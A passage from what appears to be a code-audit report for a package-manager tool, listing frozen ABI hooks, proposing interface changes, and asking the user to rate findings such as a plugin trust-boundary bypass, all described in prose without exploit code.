list in `driver.py`/`test_abi_surface.FROZEN_HOOKS`:
- `scope_meta` — used only in core (`installState`/menu), not plugins/tests; live.
- `foreign_index` (aur) — read by `stranded.py`; live.
- `ensure_remote` (flatpak), `_installed_across_scopes`, `batch_installed_index` — all have in-tree
  callers.
- `runner.run`'s `presudo=` arg is dead-but-deliberate (accepted-and-ignored compat shim for plugins
  that still pass it, documented at `runner.py:461`); not a candidate for removal while ABI_VERSION=1.

## ABI / interface candidates

- **`installed_name(rc, driver)` should be part of the frozen surface** (drivers-os-16) — it is the
  only correct reader of the driver-keyed `installed-name:` map, and plugin native drivers need it.
- **Fold a `latest_index(names)` / `candidate` hook into `NativePkgManager`** (drivers-os-02) so every
  enumerable native driver batches its candidate query from one place — this is the natural home for
  the fix and keeps a future plugin manager fast by default.
- **`native-pkg-file`/`_alt` should delegate to the resolved native driver** rather than re-encoding
  dpkg/rpm/pacman idioms (drivers-os-04/10/11 are three copies of the same drift) — the 2026-09 D1
  follow-on, still open.

## Questions for the user

1. drivers-os-01 is a trust-boundary bypass but requires the user to have declared + synced (not
   trusted) a plugin and then install one of its native vendor-repo components. Rate it CRITICAL
   (root code execution across the documented trust boundary) or HIGH (preconditioned)?
   *Verifier: HIGH. The same untrusted plugin already reaches root on the same install through
   `native-pkg-file`, so the increment is the persistent repo plus the broken documented promise
   (see the finding's Verified line). Note also that it doesn't need a plugin-specific component:
   a plugin patching a core pick's binding is enough.*
2. For drivers-os-02, is the acceptable target "one batched candidate call per driver" (matches apt/
   xbps today), or do you want the fuller `NativePkgManager` `latest_index` hook so plugin managers
   inherit it? The former is a smaller, per-driver change; the latter is the ABI addition.
3. drivers-os-16: fix the ABI (promote `installed_name`) now, or wait until a plugin actually ships a
   dict `installed-name:` driver? The in-tree void example already crashes on the core `rust` binding's
   shape if it were the active driver.

## Refuted on verification

None. All four checked findings (drivers-os-01, -02, -03, -06) were confirmed. 01 and 03 had
their severity changed rather than being refuted.
